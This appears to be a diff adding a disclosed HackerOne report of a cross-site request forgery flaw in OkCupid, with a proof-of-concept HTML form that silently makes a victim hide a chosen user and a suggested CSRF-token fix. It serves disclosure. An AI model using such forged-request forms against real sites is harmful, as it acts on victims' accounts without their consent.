@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/2974
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/smiegles
+ReportedTo:OkCupid(okcupid)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:09.04.2014 21:40:27
+
+Summary:
+
+Hi,
+
+The html code below :
+<form action="https://www.okcupid.com/hidden-users" method="post">
+	<input name="rejectee_username" value="smiegles">
+	<input name="btnreject" value="hide">
+	<input type="submit">
+</form>
+
+Will make it possible to `hide` an user..
+
+You can patch this by supplying a CSRF token :)
+
+Best regards,
+
+Olivier Beg
